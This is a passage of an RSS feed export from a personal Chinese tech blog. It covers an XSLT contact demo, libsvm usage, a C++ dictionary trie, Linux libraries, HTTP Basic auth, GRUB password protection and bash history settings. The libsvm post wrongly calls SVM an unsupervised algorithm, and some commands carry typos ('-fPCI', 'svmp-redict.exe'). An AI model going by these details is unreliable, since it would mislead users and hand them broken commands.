xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;<br>&lt;xsl:template match="/"&gt;<br>&lt;div&gt;<br>&lt;xsl:apply-templates select="/contacts/person"/&gt;<br>&lt;/div&gt;<br>&lt;/xsl:template&gt;<br>&lt;xsl:template match="person"&gt;<br>&lt;a href="javascript:showPerson({@id});"&gt;<br>&lt;xsl:value-of select="first_name"/&gt;&lt;xsl:text&gt; &lt;/xsl:text&gt;<br>&lt;xsl:value-of select="last_name"/&gt;<br>&lt;/a&gt;&lt;br/&gt;<br>&lt;/xsl:template&gt;<br>&lt;/xsl:stylesheet&gt;<span style="text-decoration: underline;"><br></span><span style="font-weight: bold; font-style: italic; text-decoration: underline;">display.xslt<br></span>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br>&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;<br>&lt;xsl:param name="personid"&gt;0&lt;/xsl:param&gt;<br>&lt;xsl:template match="/"&gt;<br>&lt;xsl:if test="$personid &gt; 0"&gt;<br>&lt;div&gt;<br>&lt;xsl:apply-templates select="/contacts/person[@id=$personid]"/&gt;<br>&lt;/div&gt;<br>&lt;/xsl:if&gt;<br>&lt;/xsl:template&gt;<br>&lt;xsl:template match="person"&gt;<br>Name:<br>&lt;xsl:value-of select="first_name"/&gt;&lt;xsl:text&gt; &lt;/xsl:text&gt;<br>&lt;xsl:value-of select="last_name"/&gt;&lt;br/&gt;<br>Type: &lt;xsl:value-of select="@type"/&gt;&lt;br/&gt;<br>Company: &lt;xsl:value-of select="company"/&gt;&lt;br/&gt;<br>Address: &lt;xsl:value-of select="address1"/&gt;, &lt;xsl:value-of select="address2"/&gt;,<br>&lt;xsl:value-of select="country"/&gt; &lt;xsl:text&gt; &lt;/xsl:text&gt;<br>&lt;xsl:value-of select="postal_code"/&gt;<br>&lt;/xsl:template&gt;<br>&lt;/xsl:stylesheet&gt;<br><span style="font-weight: bold; font-style: italic; text-decoration: underline;">demo.html<br><br></span>&lt;html&gt;<br>&lt;head&gt;<br>&lt;script type="text/javascript" src="browserDetect.js"&gt;&lt;/script&gt;<br>&lt;script type="text/javascript" src="xDom.js"&gt;&lt;/script&gt;<br>&lt;script language="javascript"&gt;<br>function runInit() {<br>&nbsp;&nbsp; &nbsp;if (blnFailed){<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;alert(strFailedReason);<br>&nbsp;&nbsp; &nbsp;}&nbsp;&nbsp; &nbsp;<br>&nbsp;&nbsp; &nbsp;else {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;doLoadXMLFromURL();<br>&nbsp;&nbsp; &nbsp;}<br>}<br>function doLoadXMLFromURL() {<br>&nbsp;&nbsp; &nbsp;oXMLFromURL = xDOM.createDOMDocument();<br>&nbsp;&nbsp; &nbsp;oXMLFromURL.onreadystatechange = onLoad_LoadXMLFromURL;<br>&nbsp;&nbsp; &nbsp;oXMLFromURL.load("contacts.xml");<br>}<br>function onLoad_LoadXMLFromURL() {<br>&nbsp;&nbsp; &nbsp;if (oXMLFromURL.readyState == 4) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;oXSLT=xDOM.createDOMDocument();<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;oXSLT.onreadystatechange = onLoad_XSLTDOM;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;oXSLT.load("select.xslt");<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;oXSLTDisplay=xDOM.createDOMDocument();<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;oXSLTDisplay.onreadystatechange = onLoad_XSLTDOM;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;oXSLTDisplay.load("display.xslt");<br>&nbsp;&nbsp; &nbsp;}<br>}<br>function onLoad_XSLTDOM() {<br>&nbsp;&nbsp; &nbsp;var strOutput;<br>&nbsp;&nbsp; &nbsp;var oOutput = xDOM.createDOMDocument();<br>&nbsp;&nbsp; &nbsp;if (oXSLT.readyState == 4) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;strOutput = oXMLFromURL.transformNode(oXSLT);<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;document.getElementById("contacts").innerHTML = strOutput;<br>&nbsp;&nbsp; &nbsp;}<br>}<br>function showPerson(intPersonID){<br>&nbsp;&nbsp; &nbsp;var strOutput;<br>&nbsp;&nbsp; &nbsp;for (var i=0; i &lt; oXSLTDisplay.documentElement.childNodes.length; i++) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (oXSLTDisplay.documentElement.childNodes[i].nodeName == "xsl:param") {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;oXSLTDisplay.documentElement.childNodes[i].childNodes[0].nodeValue = intPersonID;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;strOutput = oXMLFromURL.transformNode(oXSLTDisplay);<br>&nbsp;&nbsp; &nbsp;document.getElementById("displayDetails").innerHTML = strOutput;<br>}<br>&lt;/script&gt;<br>&lt;/head&gt;<br>&lt;body onLoad="runInit();"&gt;<br>&lt;div id="contacts"&gt;&lt;/div&gt;<br>&lt;div id="displayDetails"/&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372008326111620119/</guid>
    </item>
    <item>
      <title>
<![CDATA[SVM支持向量机+libsvm用法]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201082103012777/</link>
      <description>
<![CDATA[SVM是一种无监督学习算法(其它无监督学习算法有kNN，SOM等)，可用于模式识别或回归时。
但其用到大量的数学运算，需要一定的数学基础。但是如果使用libsvm，则可以不必关心svm实现细节，直接专注问题与建模。<br>libsvm是台湾大学林智仁(Lin Chih-Jen)副教授等开发设计的一个简单、易于使用和快速有效的SVM模式识别与回归的软件包，提供源代码和可执行文件。<br>使用方法：<br>
1.下载软件包 libsvm<br>
http://www.csie.ntu.edu.tw/~cjlin/cgi-bin/libsvm.cgi?+http://www.csie.ntu.edu.tw/~cjlin/libsvm+zip<br>
 将libsvm解压缩到任意文件夹下，如E:\libsvm<br>
<br>
2. 使用svm-toy进行测试,双击libsvm/windows/svm-toy.exe<br>点击Change按钮改变颜色，用鼠标点击在画布上画出如左图所示的点集，然后点Run按钮产生如右图的图像。<br>可以看出分类效果相当不错。<br>然后点Save按钮保存为tdata，供下一步使用。<br><div><img title="SVM支持向量机+libsvm用法 - hankjin - 云水居" alt="SVM支持向量机+libsvm用法 - hankjin - 云水居" style="margin: 10px 10px 10px 0pt; float: left;" src="http://img762.ph.126.net/UgvWGJ3Cmtk3A2vd2hesag==/4934537816714574550.jpg" height="344" width="310"></div><br>&nbsp;<img title="SVM支持向量机+libsvm用法 - hankjin - 云水居" alt="SVM支持向量机+libsvm用法 - hankjin - 云水居" style="margin: 0pt 0pt 0pt 10px; float: none;" src="http://img.ph.126.net/pb-X04gtBYdIE9xgb6T1mA==/3283687078308020750.jpg" height="334" width="302"> <br><br>3. 使用svm-train等进行测试<br>3.1下载gnuplot ftp://ftp.gnuplot.info/pub/gnuplot/gp400win32.zip, 解压缩到C:\tmp目录下<br>3.2安装python<br>3.3将第2步生成的数据<br>3.4将libsvm/tools文件夹下的grid.py复制到libsvm/windows文件夹下。然后在命令行下进入libsvm/windows目录 ，执行<br>python grid.py tdata<br>会看到一堆数据和一个图在迅速变化，运行结束后，最后一行有参数，例如<br>...<br>[local] 13 -3 100.0 (best c=128.0, g=0.5, rate=100.0)<br>128.0 0.5 100.0<br>前两个分别是c和g，用这两个参数进行训练<br>svm-train.exe -c 128.0 -g 0.5 tdata<br>可以得到tdata.model，然后用这个tdata.model对tdata进行预测<br>svmp-redict.exe tdata tdata.model tdata.out <br>Accuracy = 100% (53/53) (classification)<br>这个数据比较规范，所以结果是100%<br><br>参考文档<br>http://www.cmlab.csie.ntu.edu.tw/~cyy/learning/tutorials/libsvm.pdf<br>http://www.csie.ntu.edu.tw/~piaip/svm/svm_cjlin_dm.pdf<br>http://www.csie.ntu.edu.tw/~cjlin/libsvm/]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Math</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201082103012777/</guid>
    </item>
    <item>
      <title>
<![CDATA[中文字典的索引与树的存储与访问]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201010384110122/</link>
      <description>
<![CDATA[中文字典可以使用索引与树两种存储与访问方式：<br><b>索引</b><br>索引的存储方式很简单，first指向第一个子节点，next指向下一个兄弟节点。<br>如下图所示：<br>root有四个子节点 son1 son2 son3 sonx<br>son1有两个子节点son11 son12<br>访问方式为：<br>root-&gt;first获得root的第一个子节点son1，然后通过son1-&gt;next获得root的第二个子节点son2，son2-&gt;next获得son3，son3-&gt;next获得sonx<br>然后从son1-&gt;first获得son1的第一个子节点son11，然后通过son11-&gt;next获得son1的第二个子节点son12<br><br><div><img title="中文字典的索引与树的存储与访问 - hankjin - 云水居" alt="中文字典的索引与树的存储与访问 - hankjin - 云水居" style="margin: 0pt 10px 0pt 0pt;" src="http://img692.ph.126.net/nIJ5F9RIAIR6X78PzxQNRg==/2886807361145576467.png"></div>&nbsp;<br><br><b>哈希字典树</b><br>从前面的索引结构可以看出，要访问sonx节点，要通过root-&gt;first-&gt;next-&gt;next-&gt;next，才能达到，如果一个节点有几百几千个子节点，访问的复杂度将会非常大。<br>根据前面的索引，可以生成哈希字典树，将每个节点的所有子节点指针存储在一个指针数组中，这样就可以利用哈希的特性快速定位到子节点。复杂度为c<br><br><div><img title="中文字典的索引与树的存储与访问 - hankjin - 云水居" alt="中文字典的索引与树的存储与访问 - hankjin - 云水居" style="margin: 0pt 10px 0pt 0pt;" src="http://img776.ph.126.net/OfzznKVQ8uqx8whzLqyjAA==/1265792970268949606.png"></div><b>&nbsp;代码:</b><br>从CSDN上下载一个字典http://d.download.csdn.net/down/382024/oldfox126<br>然后使用以下命令转换得到字典文件<br>iconv -f gbk -t utf-8 dict_chs_gbk.txt |awk '{print $1}' | tee cndict.in<br>然后编译执行下面的代码文件即可:<br>/*<br>&nbsp;* @desc: index and tree<br>&nbsp;* @date: 2010-11-3<br>&nbsp;* @author: hankjin<br>&nbsp;* @version: 1.0<br>&nbsp;* @platform: ubuntu 10.04<br>&nbsp;* @tree:index = 40:1<br>&nbsp;*/<br>#include &lt;iostream&gt;<br>#include &lt;fstream&gt;<br>#include &lt;cmath&gt;<br>#include &lt;cstring&gt;<br>#include &lt;ctime&gt;<br>using namespace std;<br>#define MAXN 40<br><br>typedef struct _node{<br>&nbsp;&nbsp;&nbsp; struct _node *first;&nbsp;&nbsp;&nbsp; //first element of index<br>&nbsp;&nbsp;&nbsp; struct _node *next;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //next element of index<br>&nbsp;&nbsp;&nbsp; struct _node **sons;&nbsp;&nbsp;&nbsp; //hash array<br>&nbsp;&nbsp;&nbsp; int size;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //hash array size<br>&nbsp;&nbsp;&nbsp; int used;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //son number<br>&nbsp;&nbsp;&nbsp; wchar_t value;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //value<br>&nbsp;&nbsp;&nbsp; bool isword;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //is end of word or middle <br>&nbsp;&nbsp;&nbsp; _node(wchar_t v){<br>&nbsp;&nbsp;&nbsp; sons=NULL;<br>&nbsp;&nbsp;&nbsp; first=next=NULL;<br>&nbsp;&nbsp;&nbsp; used=0;<br>&nbsp;&nbsp;&nbsp; value=v;<br>&nbsp;&nbsp;&nbsp; isword=false;<br>&nbsp;&nbsp;&nbsp; }<br>}node;<br>//add a element to index<br>void indexadd(node *root, wchar_t *word);<br>//convert index to tree<br>void index2tree(node *root);<br>//find by index<br>bool indexfind(node *root, wchar_t *word);<br>//find by tree<br>bool treefind(node *root, wchar_t *word);<br>//tree hash<br>inline int treehash(node *p, wchar_t value){<br>&nbsp;&nbsp;&nbsp; return (int)value % p-&gt;size;<br>}<br>//calc hash array size, accord to son number.<br>//rule: least prime number which is larger then 2 times son number<br>//eg: if a node has 5 son, 11 is the least prime larger then 2*5<br>inline int hashfactor(int x){<br>&nbsp;&nbsp;&nbsp; if(x&lt;3)//at least 3<br>&nbsp;&nbsp;&nbsp; return 3;<br>&nbsp;&nbsp;&nbsp; for(int i, res=x/2*4+1; ; res+=2){<br>&nbsp;&nbsp;&nbsp; for(i=3; i&lt;=sqrt(res); i+=2){//is prime<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(res%i==0)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; if(res%i!=0)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return res;<br>&nbsp;&nbsp;&nbsp; }<br>}<br>locale lang("en_US.utf-8");<br>wifstream fin("cndict.in");<br>wifstream fin1("cndict.in");<br>wifstream fin2("cndict.in");<br>int main(){<br>&nbsp;&nbsp;&nbsp; fin.imbue(lang);<br>&nbsp;&nbsp;&nbsp; fin1.imbue(lang);<br>&nbsp;&nbsp;&nbsp; fin2.imbue(lang);<br><br>&nbsp;&nbsp;&nbsp; node root(' ');<br>&nbsp;&nbsp;&nbsp; wchar_t tmp[MAXN];<br>&nbsp;&nbsp;&nbsp; //build index<br>&nbsp;&nbsp;&nbsp; while(fin&gt;&gt;tmp){<br>&nbsp;&nbsp;&nbsp; indexadd(&amp;root, tmp);<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; //convert from index to tree, with index keeped<br>&nbsp;&nbsp;&nbsp; index2tree(&amp;root);<br>&nbsp;&nbsp;&nbsp; //cin&gt;&gt;tmp;<br>&nbsp;&nbsp;&nbsp; wchar_t word[] = L"市场";<br>&nbsp;&nbsp;&nbsp; //int M = 10;<br>&nbsp;&nbsp;&nbsp; int M = 1;<br>&nbsp;&nbsp;&nbsp; //int N = 10000000;<br>&nbsp;&nbsp;&nbsp; int N = 1000000;<br>&nbsp;&nbsp;&nbsp; clock_t t1 = clock();<br>&nbsp;&nbsp;&nbsp; while(fin1&gt;&gt;tmp){<br>&nbsp;&nbsp;&nbsp; for(int i=0;i&lt;M;i++)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; indexfind(&amp;root, tmp);<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; clock_t t2 = clock();<br>&nbsp;&nbsp;&nbsp; while(fin2&gt;&gt;tmp){<br>&nbsp;&nbsp;&nbsp; for(int i=0;i&lt;M;i++)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; treefind(&amp;root, tmp);<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; clock_t t3 = clock();<br>&nbsp;&nbsp;&nbsp; for(int i=0;i&lt;N;i++){<br>&nbsp;&nbsp;&nbsp; indexfind(&amp;root, word);<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; clock_t t4 = clock();<br>&nbsp;&nbsp;&nbsp; for(int i=0;i&lt;N;i++){<br>&nbsp;&nbsp;&nbsp; treefind(&amp;root, word);<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; clock_t t5 = clock();<br>&nbsp;&nbsp;&nbsp; cout&lt;&lt;"Index/Tree average find time:"&lt;&lt;(t2-t1)&lt;&lt;"/"&lt;&lt;(t3-t2)&lt;&lt;endl;<br>&nbsp;&nbsp;&nbsp; cout&lt;&lt;"Index/Tree find time:"&lt;&lt;(t4-t3)&lt;&lt;"/"&lt;&lt;(t5-t4)&lt;&lt;endl;<br>&nbsp;&nbsp;&nbsp; return 0;<br>}<br>void indexadd(node *root, wchar_t *word){<br>&nbsp;&nbsp;&nbsp; node *prev, *p, *cur = root;<br>&nbsp;&nbsp;&nbsp; for(; *word; word++){<br>&nbsp;&nbsp;&nbsp; if(cur-&gt;first == NULL){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; cur-&gt;first = new node(*word);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; cur-&gt;used++;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; cur = cur-&gt;first;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; continue;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; for(p = cur-&gt;first; p; prev=p,p=p-&gt;next){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(p-&gt;value == *word){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; cur = p;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; if(p==NULL){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; prev-&gt;next = new node(*word);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; cur-&gt;used++;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; cur = prev-&gt;next;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; cur-&gt;isword=true;<br>}<br>void index2tree(node *cur){<br>&nbsp;&nbsp;&nbsp; if(cur==NULL) return ;<br>&nbsp;&nbsp;&nbsp; cur-&gt;size = hashfactor(cur-&gt;used);<br>&nbsp;&nbsp;&nbsp; cur-&gt;sons = new node*[cur-&gt;size];<br>&nbsp;&nbsp;&nbsp; memset((void*)cur-&gt;sons, 0, sizeof(node *)*cur-&gt;size);<br>&nbsp;&nbsp;&nbsp; for(node *p = cur-&gt;first; p; p=p-&gt;next){<br>&nbsp;&nbsp;&nbsp; int key=treehash(cur, p-&gt;value);<br>&nbsp;&nbsp;&nbsp; for(node *pos=cur-&gt;sons[key]; pos!=NULL; )<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; pos=cur-&gt;sons[(++key)%cur-&gt;size];<br>&nbsp;&nbsp;&nbsp; cur-&gt;sons[key%cur-&gt;size]=p;<br>&nbsp;&nbsp;&nbsp; index2tree(p);<br>&nbsp;&nbsp;&nbsp; }<br>}<br>bool indexfind(node *root, wchar_t *word){<br>&nbsp;&nbsp;&nbsp; node *p, *cur = root;<br>&nbsp;&nbsp;&nbsp; for(; *word; word++){<br>&nbsp;&nbsp;&nbsp; for(p=cur-&gt;first; p; p=p-&gt;next){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(p-&gt;value == *word){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; cur = p;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; if(p==NULL)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; return p==NULL ? false : p-&gt;isword;<br>}<br>bool treefind(node *root, wchar_t *word){<br>&nbsp;&nbsp;&nbsp; node *p, *cur = root;<br>&nbsp;&nbsp;&nbsp; for(; *word; word++){<br>&nbsp;&nbsp;&nbsp; int key=treehash(cur, *word);<br>&nbsp;&nbsp;&nbsp; for(p=cur-&gt;sons[key]; p; p=cur-&gt;sons[(++key)%cur-&gt;size]){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(p-&gt;value == *word){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; cur = p;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; if(p==NULL)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; return p==NULL ? false : cur-&gt;isword;<br>}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201010384110122/</guid>
    </item>
    <item>
      <title>
<![CDATA[Linux动态和静态库]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720081029536961/</link>
      <description>
<![CDATA[示例代码: hello.h + hello.c + main.c<br>1. hello.h<br>#ifndef HELLO_H<br>#define HELLO_H <br>void hello(const char *name);<br>#endif //HELLO_H<br>2. hello.c<br>&nbsp;#include &lt;stdio.h&gt;<br>&nbsp; void hello(const char *name)<br>&nbsp;{<br>&nbsp;&nbsp; printf("Hello %s!\n", name);<br>&nbsp;}<br>3. main.c<br>&nbsp;#include "hello.h"<br>&nbsp;int main()<br>&nbsp;{<br>&nbsp;&nbsp; hello("everyone");<br>&nbsp;&nbsp; return 0;<br>&nbsp;}<br>静态库<br>gcc -c hello.c<br>ar cr libhello.a hello.o<br>gcc -o hello main.c libhello.a<br>#or gcc -o hello main.c -L. -lhello<br>动态库<br>gcc -shared -fPCI -o libhello.so hello.o <br>gcc -o hello main.c -L. -lhello<br>export LD_LIBRARY_PATH=.:$LD_LIBRARY_PATH<br>#or mv libhello.so /lib<br>#or mv libhello.so /usr/lib<br>#or echo `pwd` &gt;&gt;/etc/ld.conf;ldconfig<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720081029536961/</guid>
    </item>
    <item>
      <title>
<![CDATA[HTTP的BASIC验证]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720071017104746809/</link>
      <description>
<![CDATA[<P>服务器端：</P>
<P>方式一：在web.xml中配置，可以参考CATALINA_HOME/server/manager/WEB-INF/web.xml</P>
<P>方式二：在程序中coding，参考如下：</P>
<P>if(request.getHeader("Authorization")==null){ <BR>&nbsp;&nbsp;&nbsp; response.setStatus(401); <BR>&nbsp;&nbsp; &nbsp;response.setHeader("WWW-authenticate","Basic realm=\"请输入管理员密码\"");&nbsp;<BR>}else if( !(request.getHeader("Authorization").equals(pass))){<BR>&nbsp;&nbsp;&nbsp; response.setStatus(401);&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; response.setHeader("WWW-authenticate","Basic realm=\"用户名或者密码错误\"");<BR>&nbsp;&nbsp;&nbsp; out.print("对不起你没有权限！！");<BR>&nbsp;&nbsp; &nbsp;return;<BR>}<BR></P>
<P>GET /manager HTTP/1.0<BR>Content-Type: application/x-www-form-urlencoded<BR>Authorization: Basic &lt;base64encode(user:pass)&gt;</P>
<P>方法一：直接使用new sun.misc.BASE64Encoder().encode(byte[])构造HTTP头</P>
<P>方法二：&nbsp;&nbsp;Authenticator.setDefault(new AuthImpl()); 然后使用HttpURLConnection连接即可，这种方式更灵活</P>
<P>class AuthImpl extends Authenticator {<BR>&nbsp;protected PasswordAuthentication getPasswordAuthentication() {<BR>&nbsp;&nbsp;String user = "admin";<BR>&nbsp;&nbsp;char pass[] = "admin".toCharArray();<BR>&nbsp;&nbsp;return new PasswordAuthentication(user, pass);<BR>&nbsp;} <BR>}</P>
<P>BTW</P>
<P>Http的Session和Https的Sessin不能互相传递</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Network</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720071017104746809/</guid>
    </item>
    <item>
      <title>
<![CDATA[谁动了我的grub]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720094319257291/</link>
      <description>
<![CDATA[如果用Grub引导，Linux忘记密码以后，只需要在grub中修改启动参数，就可以进入单用户模式重设密码，可谓有利也有弊。好处当然是即使忘记密码也不一定要重装系统，坏处就是给xx之徒以可乘之机。<br>解决方案：<br>设置grub密码，首先用命令 grub-md5-crypt产生一个加密过的密码，然后修改menu.lst，如下所示：第一个密码是grub密码，用户要进入grub模式时才需要输入，否则一切和普通启动一样，第二和第三个是菜单项密码，用户要进入相应的系统才需要输入密码。<br>建议设置第一个密码，即grub密码。至于菜单项密码则只对安全性要求特高，平时也不用的系统设置。<br><font color="#008000">password –-md5 
&lt;密码1&gt;<br>timeout=30<br>default=0<br>title “redhat AS 4”<br>password –-md5 
&lt;密码2&gt;<br>root (hd0,1)<br>kernel /vmlinuz ro root=LABEL=/<br>initrd 
/initrd-xxx.img<br>title “windows”<br>password –-md5 &lt;密码3&gt;<br>rootnoverify 
（hd0,0）<br>chainloader +1</font><br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720094319257291/</guid>
    </item>
    <item>
      <title>
<![CDATA[[Fw]大型网站架构演变和知识体系]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200910711020291/</link>
      <description>
<![CDATA[[基础]<br>1.分离数据库&nbsp; 将数据库服务器和网站服务器分别放在两台机器上<br><br>[初级:缓存]<br>2.缓存静态页 在用户和网站服务器中间增加squid，缓存静态页面<br>3.缓存静态部分 用squid缓存动态页面的静态部分<br>4.缓存数据&nbsp; 将用户信息等常用数据缓存到内存<br><br>[中级:增加]<br>5.增加服务器 增加一台网站服务器，负载均衡降低访问压力<br>6.增加数据库 数据库集群或将表分布到不同的数据库，从而加快数据库访问速度<br>7.分表 DAL？？<br><br>[高级:架构]<br>8.增加服务器 硬件负载均衡，增加多台网站服务器<br>9.改变数据库 使用bigtable等部分替代数据库存储<br>10.大型分布式应用 目前的终极方案<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200910711020291/</guid>
    </item>
    <item>
      <title>
<![CDATA[自由切换Windows和Ubuntu双启动]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200931811323622/</link>
      <description>
<![CDATA[Windows安装在hd0,0 Ubuntu安装在hd0,1<br>在Linux的Grub或者Windows的Grub4dos两种启动方式之间自由切换<br>1. Grub启动<br>在menu.lst中增加<br>title Grub4DOS<br>root (hd0,0)<br>kernel /boot/grub/memdisk.gz<br>initrd /boot/grub/win99.zip<br>然后在win99.zip中加入autorun.bat<br>grub --config-file=menu.lst<br><br>2. Grub4DOS启动<br>title Ubuntu<br>root (hd0,1)<br>kernel /vmlinuz-&lt;TAB&gt; root=/dev/sda2<br>initrd /init&lt;TAB&gt;<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200931811323622/</guid>
    </item>
    <item>
      <title>
<![CDATA[记录bash操作记录]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372013015102128710/</link>
      <description>
<![CDATA[<p><span lang="EN-US"   style=""   sans-serif=""   colorfd=""   >HISTFILE=~/.bash_history</span></p>  <p><span lang="EN-US"   style=""   sans-serif=""   colorfd=""   >HISTSIZE=1000000&nbsp;&nbsp;&nbsp;&nbsp; </span></p>  <p><span lang="EN-US"   style=""   sans-serif=""   colorfd=""   >export&nbsp; HISTFILE</span></p>  <p><span lang="EN-US"   style=""   sans-serif=""   colorfd=""   >export HISTCONTROL=ignoredups&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></p>  <p><span lang="EN-US"   style=""   sans-serif=""   colorfd=""   >export HISTIGNORE="&amp;:bg:fg:exit:ls:pwd"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></p>  <p><span lang="EN-US"   style=""   sans-serif=""   colorfd=""   >shopt -s histappend&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 